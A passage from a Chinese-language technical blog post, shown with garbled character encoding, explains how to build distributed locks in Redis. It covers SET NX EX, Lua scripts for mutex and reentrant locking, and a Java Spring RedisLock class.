è§£å†³ï¼Œç„¶åä½¿ç”¨åˆ†å¸ƒå¼é”ï¼‰ã€‚æ¢å¤åº“å­˜ä¹Ÿä¹Ÿæœ‰åˆ†å¸ƒå¼äº‹åŠ¡é—®é¢˜ï¼Œè¿˜éœ€è¦åˆ†å¸ƒå¼é”ï¼Œå¦‚æœæ¢å¤åº“å­˜å¤±è´¥ï¼Œåˆ™è®¢å•çŠ¶æ€ä¹Ÿå¾—å›æ»šã€‚</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> tb_order <span class="keyword">set</span> status <span class="operator">=</span> <span class="number">2</span>, pay_time <span class="operator">=</span> NOW() <span class="keyword">where</span> order_id <span class="operator">=</span> <span class="number">45154151</span> <span class="keyword">AND</span> status <span class="operator">=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149735.png" alt="image-20210427224336819"></p>
<p>è®¢å•æœåŠ¡å‡è®¾æœ‰10å°è®¢å•å¾®æœåŠ¡, åº“å­˜è¢«æ¢å¤äº†ä¸¤æ¬¡;</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149736.png" alt="image-20210427224444490"></p>
<h3 id="çº¿ç¨‹é”"><a href="#çº¿ç¨‹é”" class="headerlink" title="çº¿ç¨‹é”"></a>çº¿ç¨‹é”</h3><p>æ²¡ç”¨, å¤šä¸ªè®¢å•æœåŠ¡æ˜¯å¤šä¸ªJVM,å†…å­˜ä¸­çš„é”æ˜¾ç„¶æ˜¯ä¸å…±äº«çš„,æ¯ä¸ªJVMè¿›ç¨‹éƒ½æœ‰è‡ªå·±çš„é”, è‡ªç„¶æ— æ³•ä¿è¯çº¿ç¨‹çš„äº’æ–¥äº†;</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149737.png" alt="image-20210427224642737"></p>
<h3 id="åˆ†å¸ƒå¼é”-1"><a href="#åˆ†å¸ƒå¼é”-1" class="headerlink" title="åˆ†å¸ƒå¼é”"></a>åˆ†å¸ƒå¼é”</h3><p>å¤šè¿›ç¨‹å¯è§; äº’æ–¥; å¯é‡å…¥(å¯é€‰); é˜»å¡é”(å¯é€‰):è·å–å¤±è´¥æ—¶, å…·å¤‡é‡è¯•æœºåˆ¶, å°è¯•å†æ¬¡è·å–é”; æ€§èƒ½å¥½(å¯é€‰); é«˜å¯ç”¨;</p>
<p>å¸¸è§çš„åˆ†å¸ƒå¼é”è§£å†³æ–¹æ¡ˆåŒ…æ‹¬: åŸºäºæ•°æ®åº“å®ç°ã€åŸºäºç¼“å­˜(Redis)å®ç°ã€åŸºäºzookeeperå®ç°</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149738.png" alt="image-20210427224727255"></p>
<h2 id="Rediså®ç°åˆ†å¸ƒå¼é”"><a href="#Rediså®ç°åˆ†å¸ƒå¼é”" class="headerlink" title="Rediså®ç°åˆ†å¸ƒå¼é”"></a>Rediså®ç°åˆ†å¸ƒå¼é”</h2><h3 id="ç‰ˆæœ¬ä¸€-åŸºæœ¬å®ç°"><a href="#ç‰ˆæœ¬ä¸€-åŸºæœ¬å®ç°" class="headerlink" title="ç‰ˆæœ¬ä¸€:åŸºæœ¬å®ç°"></a>ç‰ˆæœ¬ä¸€:åŸºæœ¬å®ç°</h3><p>å¤šè¿›ç¨‹å¯è§: Redisæœ¬èº«å°±æ˜¯åŸºäºJVMä¹‹å¤–çš„, å› æ­¤æ»¡è¶³å¤šè¿›ç¨‹å¯è§çš„è¦æ±‚;</p>
<p>äº’æ–¥: åŸºäºredis setnxæŒ‡ä»¤å®ç°, set when not exits, å¤šæ¬¡æ‰§è¡Œsetnxå‘½ä»¤æ—¶, åªæœ‰ç¬¬ä¸€ä¸ªæ‰§è¡Œçš„æ‰ä¼šæˆåŠŸå¹¶è¿”å›1, å…¶ä½™æƒ…å†µéƒ½æ˜¯è¿”å›0;</p>
<p>é‡Šæ”¾é”: å°†keyåˆ é™¤å³å¯, ä½¿ç”¨del xxx; å¦‚æœåœ¨æ‰§è¡Œdelä¹‹å‰, æœåŠ¡çªç„¶å®•æœº, é‚£ä¹ˆé”å²‚ä¸æ˜¯æ°¸è¿œæ— æ³•åˆ é™¤äº†?  ä¸ºäº†é¿å…è¿™ä¸ªé—®é¢˜, å¯ä»¥åœ¨è·å–é”çš„æ—¶å€™, ç»™é”åŠ ä¸€ä¸ªæœ‰æ•ˆæ—¶é—´, å½“æ—¶é—´è¶…å‡ºæ—¶, å°±ä¼šè‡ªåŠ¨é‡Šæ”¾é”, è¿™æ ·å°±ä¸ä¼šæ­»é”äº†.</p>
<p>ä½†æ˜¯setnxæŒ‡ä»¤æ²¡æœ‰è®¾ç½®æ—¶é—´çš„åŠŸèƒ½, æˆ‘ä»¬è¦å€ŸåŠ©äºsetæŒ‡ä»¤, ç„¶åç»“åˆsetçš„NXå’ŒPXæ¥å®Œæˆ</p>
<p>EX: è¿‡æœŸæ—¶é—´, å•ä½ç§’; PX: è¿‡æœŸæ—¶é—´,å•ä½æ¯«ç±³; NX: ç­‰åŒäºsetnx;</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set lock 001 NX EX 30</span><br><span class="line">OK</span><br><span class="line">set lock 001 NX EX 30</span><br><span class="line">nil</span><br></pre></td></tr></table></figure>



<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149739.png" alt="image-20210427230051328"></p>
<h3 id="ç‰ˆæœ¬äºŒ-äº’æ–¥æ€§"><a href="#ç‰ˆæœ¬äºŒ-äº’æ–¥æ€§" class="headerlink" title="ç‰ˆæœ¬äºŒ: äº’æ–¥æ€§"></a>ç‰ˆæœ¬äºŒ: äº’æ–¥æ€§</h3><p>ç‰ˆæœ¬ä¸€çš„é—®é¢˜:</p>
<ol>
<li>3ä¸ªè¿›ç¨‹ï¼šAå’ŒBå’ŒCï¼Œåœ¨æ‰§è¡Œä»»åŠ¡ï¼Œå¹¶äº‰æŠ¢é”ï¼Œæ­¤æ—¶Aè·å–äº†é”ï¼Œå¹¶è®¾ç½®è‡ªåŠ¨è¿‡æœŸæ—¶é—´ä¸º10s</li>
<li>Aå¼€å§‹æ‰§è¡Œä¸šåŠ¡ï¼Œå› ä¸ºæŸç§åŸå› ï¼Œä¸šåŠ¡é˜»å¡ï¼Œè€—æ—¶è¶…è¿‡äº†10ç§’ï¼Œæ­¤æ—¶é”è‡ªåŠ¨é‡Šæ”¾äº†</li>
<li>Bæ°å¥½æ­¤æ—¶å¼€å§‹å°è¯•è·å–é”ï¼Œå› ä¸ºé”å·²ç»è‡ªåŠ¨é‡Šæ”¾ï¼ŒæˆåŠŸè·å–é”</li>
<li>Aæ­¤æ—¶ä¸šåŠ¡æ‰§è¡Œå®Œæ¯•ï¼Œæ‰§è¡Œé‡Šæ”¾é”é€»è¾‘ï¼ˆåˆ é™¤keyï¼‰ï¼Œäºæ˜¯Bçš„é”è¢«é‡Šæ”¾äº†ï¼Œè€ŒBå…¶å®è¿˜åœ¨æ‰§è¡Œä¸šåŠ¡</li>
<li>æ­¤æ—¶è¿›ç¨‹Cå°è¯•è·å–é”ï¼Œä¹ŸæˆåŠŸäº†ï¼Œå› ä¸ºAæŠŠBçš„é”åˆ é™¤äº†ã€‚</li>
</ol>
<p>é—®é¢˜å‡ºç°äº†ï¼šBå’ŒCåŒæ—¶è·å–äº†é”ï¼Œè¿åäº†äº’æ–¥æ€§ï¼</p>
<p>è§£å†³æ–¹æ¡ˆ: åœ¨åˆ é™¤ä¹‹å‰åˆ¤æ–­é”æ˜¯å¦æ—¶è‡ªå·±è®¾ç½®çš„é”, å¦‚æœä¸æ˜¯, å°±ä¸è¦åˆ é™¤</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149740.png" alt="image-20210427230526972"></p>
<h3 id="ç‰ˆæœ¬ä¸‰-é‡å…¥æ€§"><a href="#ç‰ˆæœ¬ä¸‰-é‡å…¥æ€§" class="headerlink" title="ç‰ˆæœ¬ä¸‰: é‡å…¥æ€§"></a>ç‰ˆæœ¬ä¸‰: é‡å…¥æ€§</h3><p>å¦‚æœæˆ‘ä»¬åœ¨è·å–é”ä»¥åï¼Œæ‰§è¡Œä»£ç çš„è¿‡ç¨‹ä¸­ï¼Œå†æ¬¡å°è¯•è·å–é”ï¼Œæ‰§è¡Œsetnxè‚¯å®šä¼šå¤±è´¥ï¼Œå› ä¸ºé”å·²ç»å­˜åœ¨äº†ã€‚è¿™æ ·æœ‰å¯èƒ½å¯¼è‡´æ­»é”ï¼Œè¿™æ ·çš„é”å°±æ˜¯<strong>ä¸å¯é‡å…¥</strong>çš„ã€‚</p>
<p>å¯é‡å…¥é”å¯ä»¥é¿å…å› åŒä¸€çº¿ç¨‹ä¸­å¤šæ¬¡è·å–é”è€Œå¯¼è‡´æ­»é”å‘ç”Ÿ;</p>
<p>å®ç°: </p>
<ul>
<li><p>è·å–é”: é¦–å…ˆå°è¯•è·å–é”ï¼Œå¦‚æœè·å–å¤±è´¥ï¼Œ<strong>åˆ¤æ–­è¿™ä¸ªé”æ˜¯å¦æ˜¯è‡ªå·±çš„ï¼Œå¦‚æœæ˜¯åˆ™å…è®¸å†æ¬¡è·å–</strong>ï¼Œè€Œä¸”å¿…é¡»è®°å½•é‡å¤è·å–é”çš„æ¬¡æ•°ã€‚</p>
</li>
<li><p>é‡Šæ”¾é”ï¼šé‡Šæ”¾é”ä¸èƒ½ç›´æ¥åˆ é™¤äº†ï¼Œå› ä¸ºé”æ˜¯å¯é‡å…¥çš„ï¼Œå¦‚æœé”è¿›å…¥äº†å¤šæ¬¡ï¼Œåœ¨æœ€å†…å±‚ç›´æ¥åˆ é™¤é”ï¼Œå¯¼è‡´å¤–éƒ¨çš„ä¸šåŠ¡åœ¨æ²¡æœ‰é”çš„æƒ…å†µä¸‹æ‰§è¡Œï¼Œä¼šæœ‰å®‰å…¨é—®é¢˜ã€‚å› æ­¤å¿…é¡»<strong>è·å–é”æ—¶ç´¯è®¡é‡å…¥çš„æ¬¡æ•°ï¼Œé‡Šæ”¾æ—¶åˆ™å‡å»é‡å…¥æ¬¡æ•°ï¼Œå¦‚æœå‡åˆ°0ï¼Œåˆ™å¯ä»¥åˆ é™¤é”</strong>.</p>
</li>
</ul>
<p>å› æ­¤ï¼Œå­˜å‚¨åœ¨é”ä¸­çš„ä¿¡æ¯å°±å¿…é¡»åŒ…å«ï¼škeyã€çº¿ç¨‹æ ‡è¯†ã€é‡å…¥æ¬¡æ•°ã€‚ä¸èƒ½å†ä½¿ç”¨ç®€å•çš„key-valueç»“æ„ï¼Œè¿™é‡Œæ¨èä½¿ç”¨hashç»“æ„ï¼š</p>
<ul>
<li>keyï¼šlock</li>
<li>hashKeyï¼šçº¿ç¨‹ä¿¡æ¯</li>
<li>hashValueï¼šé‡å…¥æ¬¡æ•°ï¼Œé»˜è®¤1</li>
</ul>
<p>éœ€è¦ç”¨åˆ°çš„ä¸€äº›Rediså‘½ä»¤åŒ…æ‹¬ï¼š</p>
<ul>
<li>EXISTS keyï¼šåˆ¤æ–­ä¸€ä¸ªKeyæ˜¯å¦å­˜åœ¨</li>
<li>HEXISTS key fieldï¼šåˆ¤æ–­ä¸€ä¸ªhashçš„fieldæ˜¯å¦å­˜åœ¨</li>
<li>HSET key field value ï¼šç»™ä¸€ä¸ªhashçš„fieldè®¾ç½®ä¸€ä¸ªå€¼</li>
<li>HINCRBY key field incrementï¼šç»™ä¸€ä¸ªhashçš„fieldå€¼å¢åŠ æŒ‡å®šæ•°å€¼</li>
<li>EXPIRE key secondsï¼šç»™ä¸€ä¸ªkeyè®¾ç½®è¿‡æœŸæ—¶é—´</li>
<li>DEL keyï¼šåˆ é™¤æŒ‡å®škey</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149741.png" alt="image-20210427231119197"></p>
<h3 id="Luaè„šæœ¬è§£å†³åŸå­æ€§é—®é¢˜"><a href="#Luaè„šæœ¬è§£å†³åŸå­æ€§é—®é¢˜" class="headerlink" title="Luaè„šæœ¬è§£å†³åŸå­æ€§é—®é¢˜"></a>Luaè„šæœ¬è§£å†³åŸå­æ€§é—®é¢˜</h3><p>å¦‚æœä¸èƒ½ä¿è¯è¿™äº›Rediså‘½ä»¤æ‰§è¡Œçš„åŸå­æ€§ï¼Œåˆ™æ•´ä¸ªè¿‡ç¨‹éƒ½æ˜¯ä¸å®‰å…¨çš„ã€‚</p>
<p>Redisæ”¯æŒLuaè„šæœ¬æ¥è¿è¡Œå¤šè¡Œå‘½ä»¤, å¹¶ä¸”ä¿è¯æ•´ä¸ªè„šæœ¬è¿è¡Œçš„åŸå­æ€§;</p>
<p>Redisä½¿ç”¨åŒä¸€ä¸ªLuaè§£é‡Šå™¨æ¥æ‰§è¡Œæ‰€æœ‰å‘½ä»¤ï¼ŒåŒæ—¶ï¼ŒRedisä¿è¯ä»¥ä¸€ç§åŸå­æ€§çš„æ–¹å¼æ¥æ‰§è¡Œè„šæœ¬ï¼šå½“luaè„šæœ¬åœ¨æ‰§è¡Œçš„æ—¶å€™ï¼Œä¸ä¼šæœ‰å…¶ä»–è„šæœ¬å’Œå‘½ä»¤åŒæ—¶æ‰§è¡Œï¼Œè¿™ç§è¯­ä¹‰ç±»ä¼¼äº MULTI&#x2F;EXECã€‚ä»åˆ«çš„å®¢æˆ·ç«¯çš„è§†è§’æ¥çœ‹ï¼Œä¸€ä¸ªluaè„šæœ¬è¦ä¹ˆä¸å¯è§ï¼Œè¦ä¹ˆå·²ç»æ‰§è¡Œå®Œã€‚</p>
<p>ç„¶è€Œè¿™ä¹Ÿæ„å‘³ç€ï¼Œæ‰§è¡Œä¸€ä¸ªè¾ƒæ…¢çš„luaè„šæœ¬æ˜¯ä¸å»ºè®®çš„ï¼Œç”±äºè„šæœ¬çš„å¼€é”€éå¸¸ä½ï¼Œæ„é€ ä¸€ä¸ªå¿«é€Ÿæ‰§è¡Œçš„è„šæœ¬å¹¶ééš¾äº‹ã€‚ä½†æ˜¯ä½ è¦æ³¨æ„åˆ°ï¼Œå½“ä½ æ­£åœ¨æ‰§è¡Œä¸€ä¸ªæ¯”è¾ƒæ…¢çš„è„šæœ¬æ—¶ï¼Œæ‰€ä»¥å…¶ä»–çš„å®¢æˆ·ç«¯éƒ½æ— æ³•æ‰§è¡Œå‘½ä»¤ã€‚</p>
<h3 id="æ™®é€šäº’æ–¥é”"><a href="#æ™®é€šäº’æ–¥é”" class="headerlink" title="æ™®é€šäº’æ–¥é”"></a>æ™®é€šäº’æ–¥é”</h3><p>ç‰ˆæœ¬äºŒçš„å®ç°:</p>
<ul>
<li>è·å–é”ä¸éœ€è¦è„šæœ¬</li>
<li>é‡Šæ”¾é”éœ€è¦</li>
</ul>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- åˆ¤æ–­é”æ˜¯å¦æ˜¯è‡ªå·±çš„</span></span><br><span class="line"><span class="keyword">if</span> (redis.call(<span class="string">&#x27;GET&#x27;</span>, KEYS[<span class="number">1</span>]) == ARGV[<span class="number">1</span>]) <span class="keyword">then</span></span><br><span class="line">  <span class="comment">-- æ˜¯åˆ™åˆ é™¤é”</span></span><br><span class="line">  <span class="keyword">return</span> redis.call(<span class="string">&#x27;DEL&#x27;</span>, KEYS[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment">-- ä¸æ˜¯åˆ™ç›´æ¥è¿”å›</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>å‚æ•°çš„å«ä¹‰è¯´æ˜ï¼š</p>
<ul>
<li>KEYS[1]ï¼šå°±æ˜¯é”çš„keyï¼Œæ¯”å¦‚â€lockâ€</li>
<li>ARGV[1]ï¼šå°±æ˜¯çº¿ç¨‹çš„å”¯ä¸€æ ‡è¯†ï¼Œå¯ä»¥æ—¶éšæœºå­—ç¬¦ä¸²</li>
</ul>
<h3 id="å¯é‡å…¥é”"><a href="#å¯é‡å…¥é”" class="headerlink" title="å¯é‡å…¥é”"></a>å¯é‡å…¥é”</h3><p>è·å–é”:</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> key = KEYS[<span class="number">1</span>]; <span class="comment">-- é”çš„key</span></span><br><span class="line"><span class="keyword">local</span> threadId = ARGV[<span class="number">1</span>]; <span class="comment">-- çº¿ç¨‹å”¯ä¸€æ ‡è¯†</span></span><br><span class="line"><span class="keyword">local</span> releaseTime = ARGV[<span class="number">2</span>]; <span class="comment">-- é”çš„è‡ªåŠ¨é‡Šæ”¾æ—¶é—´</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(redis.call(<span class="string">&#x27;exists&#x27;</span>, key) == <span class="number">0</span>) <span class="keyword">then</span> <span class="comment">-- åˆ¤æ–­æ˜¯å¦å­˜åœ¨</span></span><br><span class="line">	redis.call(<span class="string">&#x27;hset&#x27;</span>, key, threadId, <span class="string">&#x27;1&#x27;</span>); <span class="comment">-- ä¸å­˜åœ¨, è·å–é”</span></span><br><span class="line">	redis.call(<span class="string">&#x27;expire&#x27;</span>, key, releaseTime); <span class="comment">-- è®¾ç½®æœ‰æ•ˆæœŸ</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>; <span class="comment">-- è¿”å›ç»“æœ</span></span><br><span class="line"><span class="keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(redis.call(<span class="string">&#x27;hexists&#x27;</span>, key, threadId) == <span class="number">1</span>) <span class="keyword">then</span> <span class="comment">-- é”å·²ç»å­˜åœ¨ï¼Œåˆ¤æ–­threadIdæ˜¯å¦æ˜¯è‡ªå·±	</span></span><br><span class="line">	redis.call(<span class="string">&#x27;hincrby&#x27;</span>, key, threadId, <span class="string">&#x27;1&#x27;</span>); <span class="comment">-- ä¸å­˜åœ¨, è·å–é”ï¼Œé‡å…¥æ¬¡æ•°+1</span></span><br><span class="line">	redis.call(<span class="string">&#x27;expire&#x27;</span>, key, releaseTime); <span class="comment">-- è®¾ç½®æœ‰æ•ˆæœŸ</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>; <span class="comment">-- è¿”å›ç»“æœ</span></span><br><span class="line"><span class="keyword">end</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; <span class="comment">-- ä»£ç èµ°åˆ°è¿™é‡Œ,è¯´æ˜è·å–é”çš„ä¸æ˜¯è‡ªå·±ï¼Œè·å–é”å¤±è´¥</span></span><br></pre></td></tr></table></figure>

<p>é‡Šæ”¾é”:</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> key = KEYS[<span class="number">1</span>]; <span class="comment">-- é”çš„key</span></span><br><span class="line"><span class="keyword">local</span> threadId = ARGV[<span class="number">1</span>]; <span class="comment">-- çº¿ç¨‹å”¯ä¸€æ ‡è¯†</span></span><br><span class="line"><span class="keyword">local</span> releaseTime = ARGV[<span class="number">2</span>]; <span class="comment">-- é”çš„è‡ªåŠ¨é‡Šæ”¾æ—¶é—´</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (redis.call(<span class="string">&#x27;HEXISTS&#x27;</span>, key, threadId) == <span class="number">0</span>) <span class="keyword">then</span> <span class="comment">-- åˆ¤æ–­å½“å‰é”æ˜¯å¦è¿˜æ˜¯è¢«è‡ªå·±æŒæœ‰</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>; <span class="comment">-- å¦‚æœå·²ç»ä¸æ˜¯è‡ªå·±ï¼Œåˆ™ç›´æ¥è¿”å›</span></span><br><span class="line"><span class="keyword">end</span>;</span><br><span class="line"><span class="keyword">local</span> count = redis.call(<span class="string">&#x27;HINCRBY&#x27;</span>, key, threadId, <span class="number">-1</span>); <span class="comment">-- æ˜¯è‡ªå·±çš„é”ï¼Œåˆ™é‡å…¥æ¬¡æ•°-1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (count &gt; <span class="number">0</span>) <span class="keyword">then</span> <span class="comment">-- åˆ¤æ–­æ˜¯å¦é‡å…¥æ¬¡æ•°æ˜¯å¦å·²ç»ä¸º0</span></span><br><span class="line">    redis.call(<span class="string">&#x27;EXPIRE&#x27;</span>, key, releaseTime); <span class="comment">-- å¤§äº0è¯´æ˜ä¸èƒ½é‡Šæ”¾é”ï¼Œé‡ç½®æœ‰æ•ˆæœŸç„¶åè¿”å›</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    redis.call(<span class="string">&#x27;DEL&#x27;</span>, key); <span class="comment">-- ç­‰äº0è¯´æ˜å¯ä»¥é‡Šæ”¾é”ï¼Œç›´æ¥åˆ é™¤</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>;</span><br><span class="line"><span class="keyword">end</span>;</span><br></pre></td></tr></table></figure>

<p>æ‰§è¡Œluaè„šæœ¬</p>
<p>æŠŠè„šæœ¬å°è£…åˆ°RedisScriptå¯¹è±¡ä¸­: éœ€è¦æŠŠè„šæœ¬å†…å®¹å†™åˆ°ä»£ç ä¸­, ä½œä¸ºå‚æ•°ä¼ é€’, ä¸å¤Ÿä¼˜é›…;</p>
<p>è‡ªå·±å»åˆ›å»º<code>RedisScript</code>çš„å®ç°ç±»<code>DefaultRedisScript</code>çš„å¯¹è±¡: å¯ä»¥æŠŠè„šæœ¬æ–‡ä»¶å†™åˆ°classpathä¸‹çš„æŸä¸ªä½ç½®ï¼Œç„¶åé€šè¿‡åŠ è½½è¿™ä¸ªæ–‡ä»¶æ¥è·å–è„šæœ¬å†…å®¹ï¼Œå¹¶è®¾ç½®ç»™<code>DefaultRedisScript</code>å®ä¾‹ã€‚</p>
<p>å®šä¹‰é”æ¥å£:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.demo.lock;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> è™å“¥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RedisLock</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è·å–é”</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> releaseTime</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">tryLock</span><span class="params">(<span class="type">long</span> releaseTime)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * é‡Šæ”¾é”</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">unlock</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>æ–°å»ºä¸€ä¸ªRedisLockå®ç°: ReentranRedisLock, åˆ©ç”¨é™æ€ä»£ç å—æ¥åŠ è½½è„šæœ¬å¹¶åˆå§‹åŒ–:</p>
<p>åŠ è½½è„šæœ¬:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReentrantRedisLock</span> &#123;</span><br><span class="line">    <span class="comment">// è·å–é”çš„è„šæœ¬</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> DefaultRedisScript&lt;Long&gt; LOCK_SCRIPT;</span><br><span class="line">    <span class="comment">// é‡Šæ”¾é”çš„è„šæœ¬</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> DefaultRedisScript&lt;Object&gt; UNLOCK_SCRIPT;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="comment">// åŠ è½½è·å–é”çš„è„šæœ¬</span></span><br><span class="line">        LOCK_SCRIPT = <span class="keyword">new</span> <span class="title class_">DefaultRedisScript</span>&lt;&gt;();</span><br><span class="line">        LOCK_SCRIPT.setScriptSource(</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ResourceScriptSource</span>(<span class="keyword">new</span> <span class="title class_">ClassPathResource</span>(<span class="string">&quot;lock.lua&quot;</span>)));</span><br><span class="line">        LOCK_SCRIPT.setResultType(Long.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åŠ è½½é‡Šæ”¾é”çš„è„šæœ¬</span></span><br><span class="line">        UNLOCK_SCRIPT = <span class="keyword">new</span> <span class="title class_">DefaultRedisScript</span>&lt;&gt;();</span><br><span class="line">        UNLOCK_SCRIPT.setScriptSource(</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ResourceScriptSource</span>(<span class="keyword">new</span> <span class="title class_">ClassPathResource</span>(<span class="string">&quot;unlock.lua&quot;</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// å…¶å®ƒä»£ç ç•¥</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å®ç°æ¥å£:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.demo.lock;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.io.ClassPathResource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.core.StringRedisTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.core.script.DefaultRedisScript;</span><br><span class="line"><span class="keyword">import</span> org.springframework.scripting.support.ResourceScriptSource;</span><br><span class="line"><span class="keyword">import</span> java.util.Collections;</span><br><span class="line"><span class="keyword">import</span> java.util.UUID;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReentrantRedisLock</span> <span class="keyword">implements</span> <span class="title class_">RedisLock</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> StringRedisTemplate redisTemplate;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è®¾å®šå¥½é”å¯¹åº”çš„ key</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> String key;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * å­˜å…¥çš„çº¿ç¨‹ä¿¡æ¯çš„å‰ç¼€ï¼Œé˜²æ­¢ä¸å…¶å®ƒJVMä¸­çº¿ç¨‹ä¿¡æ¯å†²çª</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ID_PREFIX</span> <span class="operator">=</span> UUID.randomUUID().toString();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ReentrantRedisLock</span><span class="params">(StringRedisTemplate redisTemplate, String key)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.redisTemplate = redisTemplate;</span><br><span class="line">        <span class="built_in">this</span>.key = key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> DefaultRedisScript&lt;Long&gt; LOCK_SCRIPT;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> DefaultRedisScript&lt;Object&gt; UNLOCK_SCRIPT;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="comment">// åŠ è½½é‡Šæ”¾é”çš„è„šæœ¬</span></span><br><span class="line">        LOCK_SCRIPT = <span class="keyword">new</span> <span class="title class_">DefaultRedisScript</span>&lt;&gt;();</span><br><span class="line">        LOCK_SCRIPT.setScriptSource(<span class="keyword">new</span> <span class="title class_">ResourceScriptSource</span>(<span class="keyword">new</span> <span class="title class_">ClassPathResource</span>(<span class="string">&quot;lock.lua&quot;</span>)));</span><br><span class="line">        LOCK_SCRIPT.setResultType(Long.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åŠ è½½é‡Šæ”¾é”çš„è„šæœ¬</span></span><br><span class="line">        UNLOCK_SCRIPT = <span class="keyword">new</span> <span class="title class_">DefaultRedisScript</span>&lt;&gt;();</span><br><span class="line">        UNLOCK_SCRIPT.setScriptSource(<span class="keyword">new</span> <span class="title class_">ResourceScriptSource</span>(<span class="keyword">new</span> <span class="title class_">ClassPathResource</span>(<span class="string">&quot;unlock.lua&quot;</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// é”é‡Šæ”¾æ—¶é—´</span></span><br><span class="line">    <span class="keyword">private</span> String releaseTime;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">tryLock</span><span class="params">(<span class="type">long</span> releaseTime)</span> &#123;</span><br><span class="line">        <span class="comment">// è®°å½•é‡Šæ”¾æ—¶é—´</span></span><br><span class="line">        <span class="built_in">this</span>.releaseTime = String.valueOf(releaseTime);</span><br><span class="line">        <span class="comment">// æ‰§è¡Œè„šæœ¬</span></span><br><span class="line">        <span class="type">Long</span> <span class="variable">result</span> <span class="operator">=</span> redisTemplate.execute(</span><br><span class="line">                LOCK_SCRIPT,</span><br><span class="line">                Collections.singletonList(key),</span><br><span class="line">                ID_PREFIX + Thread.currentThread().getId(), <span 